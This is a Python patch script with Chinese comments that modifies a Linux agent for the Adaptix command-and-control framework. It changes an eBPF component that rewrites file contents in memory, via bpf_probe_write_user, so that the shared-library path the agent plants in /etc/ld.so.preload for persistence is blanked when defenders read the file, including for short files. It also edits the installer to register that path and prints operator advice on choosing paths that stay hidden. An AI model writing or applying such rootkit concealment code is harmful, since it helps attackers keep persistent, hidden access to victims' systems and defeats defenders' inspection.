# -*- coding: utf-8 -*-
"""ISS-083：`/etc/ld.so.preload` 的内容层对"我们写的那一行"完全不设防。

★ 这条缺口的形状比第一版判断的更深，三处叠加：

  ① **`ax_pl_register()` 登记的是基名 `"ld.so.preload"`** —— 只服务**枚举层**
     （让 `ls /etc` 看不见这个文件）。而内容层 `ax_scan` 比对的是"**文件里字面
     出现的文本**"，即我们写进去的 **.so 路径**。六个 `AxHideNameAdd` 调用者里
     **没有任何一处**登记过路径 ⇒ 词永远是 0 个，扫描再正常也没用。
     ★ 为什么只影响这一个文件：cron/systemd 的产物走**类A 整块抹平**（内容整个
     没了，路径一并消失）；而 `/etc/ld.so.preload` 在 open 分支里**先**命中
     `ax_tail_preload()`（17 字符过得了长度闸门）⇒ `kind = AX_KIND_PRELOAD` ⇒
     **永远走不到类A**。这是**有意为之**（整块抹会打断别人写的真实 preload 条目）。

  ② **`n < AX_CHUNK`（读到的字节数 < 32）整个放弃扫描**（read 分支）。
     `/etc/ld.so.preload` 最常见的形态恰恰是"只有我们写的一行短路径"——
     `/usr/lib/axp25s.so\\n` = 19 字节，**正好落在门槛外**。
     ⇒ 即使登记了路径，**短文件仍然一个字都不抹**。

  ③ **`ax_scan` 的 `lim = n - AX_CHUNK` 在短文件时是负数**，转 `__u32` 后变成
     巨大值 ⇒ `run` 的"p 超过可用范围就作废"这道闸门**失效** ⇒ p 一路扫到 96，
     从清零区构造出全零候选词去查表。它不命中（除非表里有全零 key），但
     "不越界"不该建立在"表里恰好没有某个 key"之上。

★ 为什么 p15 长期假绿（这才是重点）：
  p15 写进 `/etc/ld.so.preload` 的内容**比 32 字节长**（MARKER + 别的内容），
  所以它进了扫描、也测到了"词被抹"。而**真实场景里最需要保护的那个形态
  ——一行短路径——根本没进过扫描**。判据的**输入形态**覆盖不到被测对象的
  **定义域**，与 ISS-080「判据只查指针维度、漏掉长度维度」同族。

★ 修法与不修的部分：
  · 修 ①：`ld_preload_install` 登记它写进去的路径（**只在 ≤ 32 字符时**，
    理由见该函数内的注释）。顺带删掉该文件里"**内容层由 P3 挡住了**"这句
    已被本 ISS 证伪的注释 —— 留着它，下一个读代码的人就不会去查内容层。
  · 修 ②③：放开短文件门槛 + 尾块回钳（写回长度裁到"已返回的字节内"）。
  · **不修**：路径 > `AX_WORD`(32) 时机制上抹不干净（`ax_scan` 一次只掩/写回
    32 字节）。这条由代码常量唯一确定，且**半抹的路径比不抹更可疑** ⇒ 处置是
    **用短路径规避 + 回执警告**，不是给长路径打补丁。

每处替换断言唯一命中，否则不写盘。
"""
import io, os, shutil, sys

ROOT = "/root/cc/AdaptixServer/extenders/linux_agent/src_agent/"
BAKDIR = "/root/gp5probe/bak"        # ★ 批次10：回滚点移出交付树
BAK = BAKDIR + "/linux_agent.tools."
R = []
FILES = {}


def patch(fn, tag, old, new):
    s = FILES.setdefault(fn, io.open(ROOT + fn, encoding="utf-8").read())
    n = s.count(old)
    R.append((tag, n))
    if n == 1:
        FILES[fn] = s.replace(old, new)


# ══ redact.c 改动 ①：read 分支的短文件门槛 ════════════════════════════════
patch("bpf/redact.c", "R1-shortfile", '''        n = (int)ret;
        if (n > AX_SCAN)
            n = AX_SCAN;
        /* 写回是常量 AX_CHUNK 字节，必须整个落在**已返回**的字节内。 */
        if (n < AX_CHUNK)
            return 0;''',
      '''        n = (int)ret;
        if (n > AX_SCAN)
            n = AX_SCAN;
        /* ★ ISS-083：门槛从 `n < AX_CHUNK` 放到 `n <= 0`。
         * 原来 n < 32 就**整个不扫**，而 `/etc/ld.so.preload` 最常见的形态
         * 恰恰是"只有我们写的一行短路径"（`/usr/lib/xxx.so\\n` = 19 字节）
         * ⇒ 内容层对**最需要它的那个形态** 100% 不设防。p15 的台面因为写的
         * 内容比 32 长，一直没照到这一格（判据的输入形态覆盖不到定义域）。
         * 越界风险由 ax_scan 的尾块回钳接管：写回长度一律裁到"已返回的字节内"。 */
        if (n <= 0)
            return 0;''')

# ══ redact.c 改动 ②：ax_scan 的 lim 负值钳制 ══════════════════════════════
patch("bpf/redact.c", "R2-lim", '''static __always_inline void ax_scan(char *tmp, int n, __u8 *dst)
{
    int lim = n - AX_CHUNK;
''',
      '''static __always_inline void ax_scan(char *tmp, int n, __u8 *dst)
{
    int lim = n - AX_CHUNK;

    /* ★ ISS-083：短文件（n < AX_CHUNK）时把 lim 钳到 0 ⇒ 只扫 p=0。
     * 原值会是负数，转 __u32 后变成**巨大值**，于是 `run` 里那道
     * "p 超出可用范围就作废"的闸门整个失效 —— p 会一路扫到 AX_SCAN-AX_CHUNK，
     * 从清零区（read 分支已 memset）构造出全零候选词去查 hide_names。
     * 它确实不命中（AxHideNameAdd 拒绝空名 ⇒ 表里没有全零 key），
     * 但"不越界"不该建立在"表里恰好没有某个 key"之上。 */
    if (lim < 0)
        lim = 0;
''')

# ══ redact.c 改动 ③：尾块回钳（变长写回）══════════════════════════════════
patch("bpf/redact.c", "R3-tail", '''        res = bpf_map_lookup_elem(&hide_names, kb);
        if (res)
            bpf_probe_write_user(dst + p, (__u8 *)raw, AX_CHUNK);
    }
}''',
      '''        res = bpf_map_lookup_elem(&hide_names, kb);
        /* ★★ ISS-083 尾块回钳。原来是无条件写 AX_CHUNK(32) 字节，前提是
         *   "已返回 ≥ 32 字节"（read 分支的旧门槛保证了这点）。门槛放开后，
         *   `n` 可能只有 19：这时必须**只写已返回的那部分**，绝不能越过 ret
         *   写用户内存（调用方可能真的只给了 19 字节的缓冲）。
         * · `p < n` 的显式守卫先排掉 `n - p` 的无符号下溢；
         * · `w > AX_CHUNK` 的显式钳制是给 verifier 看的：helper 的 size 是
         *   ARG_CONST_SIZE，它得能证明 [raw, raw+w) 落在 raw[AX_CHUNK] 之内。
         * 两处都只**收紧**写回范围，不改变 `p + 32 <= n` 时的原有语义。 */
        if (res && (__u32)p < (__u32)n) {
            __u32 w = (__u32)n - (__u32)p;
            if (w > AX_CHUNK)
                w = AX_CHUNK;
            bpf_probe_write_user(dst + p, (__u8 *)raw, w);
        }
    }
}''')

# ══ ld_preload_install.c 改动 ⓪：删掉已被证伪的注释 ══════════════════════
patch("bofs/ld_preload_install.c", "L0-stale-comment", '''/// `ld.so.preload` 只存在于 /etc 下，没有误伤面。（`ssh_persist.c` 的
/// authorized_keys 正相反，那边是**刻意不藏**，源码里有 @visible 论证。）''',
      '''/// `ld.so.preload` 只存在于 /etc 下，没有误伤面。（`ssh_persist.c` 的
/// authorized_keys 正相反，那边是**刻意不藏**，源码里有 @visible 论证。）
///
/// ★★ **ISS-083 更正**：上面这句曾经写着"内容层由 P3 挡住了（`cat` 读回来是
/// 空白）"—— **那是假的**，已由 p25 实测证伪（`读回 19 字节，前 24 =
/// b'/usr/lib/axp25s.so\\n'`）。真相是三处叠加，缺的是**登记**而不是机制：
///   ① 本函数只登记基名 `ld.so.preload`，而 `ax_scan` 比对的是文件里**字面
///      出现的文本**＝我们写进去的 .so 路径 ⇒ 词 0 个，扫也白扫；
///   ② `redact.c` 的 read 分支原来 `n < AX_CHUNK(32)` 就整个不扫，而"只有
///      我们一行短路径"的 19 字节文件**正落在门槛外**；
///   ③ `ax_scan` 的 `lim` 在短文件时是负数，尾块闸门失效。
/// ②③ 已在 `redact.c` 修掉；① 由本函数下面的 `ax_pl_register(sobuf, so_len)`
/// 补上。**这正是"注释里的断言必须有台面兜底"的样本** —— 一句没被验过的
/// "已经挡住了"，会让后来的人整整一个阶段不去查那条路径。''')

# ══ ld_preload_install.c 改动 ①：登记我们写进去的路径 ════════════════════
patch("bofs/ld_preload_install.c", "L1-sig", '''static void ax_pl_register(void) {
    int hr = AxHideNameAdd((const char *)0, "ld.so.preload");''',
      '''static void ax_pl_register(const char *so, int so_n) {
    int hr = AxHideNameAdd((const char *)0, "ld.so.preload");''')

patch("bofs/ld_preload_install.c", "L2-body", '''                     "        对手 `ls /etc` 能看见 ld.so.preload。手工补：\\n"
                     "        execute bof hide_add.o <pin> ld.so.preload\\n");
}''',
      '''                     "        对手 `ls /etc` 能看见 ld.so.preload。手工补：\\n"
                     "        execute bof hide_add.o <pin> ld.so.preload\\n");

    /* ★★ ISS-083：上面那条登记的是**基名**，只服务**枚举层**（`ls /etc` 看不见
     * 这个文件）。而**内容层**（`cat /etc/ld.so.preload`）比对的是"文件里字面
     * 出现的文本" —— 也就是我们刚写进去的 **.so 路径**。不登记它，词就是 0 个，
     * 扫描再正常也一个字都抹不掉，持久化产物就这么原样躺在盘上。
     *
     * ★ 为什么只登记 ≤ `AX_WORD`(32) 字符的路径：`ax_scan` 一次只掩 32 字节、
     *   命中后也只写回 32 字节 ⇒ 更长的路径**只能抹掉前 32、尾巴必然残留**。
     *   而"半抹"（`              /very/long/path.so`）比"完整可读"**更可疑** ——
     *   一条完整的普通库路径不会引起注意，一条被啃掉半截的会。
     *   ⇒ 宁可不抹，也要在回执里说清楚，让操作者改用短路径。
     *   （32 这个数是 `redact.c` 的 `AX_WORD`，两边必须一致；改一处就得改两处。） */
    if (so && so_n > 0 && so_n <= 32) {
        int hs = AxHideNameAdd((const char *)0, so);
        BeaconPrintf(CALLBACK_OUTPUT, "    hide(内容层): %s -> %s\\n", so,
                     hs == 0 ? "ok" : (hs == -2 ? "no-map" : "fail"));
    } else if (so && so_n > 0) {
        BeaconPrintf(CALLBACK_OUTPUT,
                     "    [!] .so 路径 %d 字符 > 32：内容层抹不干净（ax_scan 的\\n"
                     "        词长上限），半抹比不抹更可疑 ⇒ **故意不登记**。\\n"
                     "        要内容层生效请把 .so 放到 ≤32 字符的路径下。\\n",
                     so_n);
    }
}''')

# ══ 两个调用点 ════════════════════════════════════════════════════════════
# 先换带 return 的那个（唯一），换完之后另一个就唯一了。
patch("bofs/ld_preload_install.c", "L3-call1", '''                ax_pl_register();
                return;''',
      '''                ax_pl_register(sobuf, so_len);
                return;''')

bad = [t for t, n in R if n != 1]
print("第一轮命中:", R)
if bad:
    print("ABORT 未命中/不唯一:", bad)
    sys.exit(1)

# 第二轮：剩下的那个调用点（此时全文件只剩 1 处 `ax_pl_register();`）
s = FILES["bofs/ld_preload_install.c"]
n = s.count("    ax_pl_register();")
print("第二轮 剩余调用点:", n)
if n != 1:
    print("ABORT 剩余调用点不唯一:", n)
    sys.exit(1)
FILES["bofs/ld_preload_install.c"] = s.replace("    ax_pl_register();",
                                               "    ax_pl_register(sobuf, so_len);")

# 备份（改之前）
for p in FILES:
    dst = BAK + os.path.basename(p) + ".bak83"
    if not os.path.exists(dst):
        shutil.copy2(ROOT + p, dst)
    print("bak:", dst)

for p, s in FILES.items():
    io.open(ROOT + p, "w", encoding="utf-8").write(s)
print("OK 已写入:", sorted(FILES))
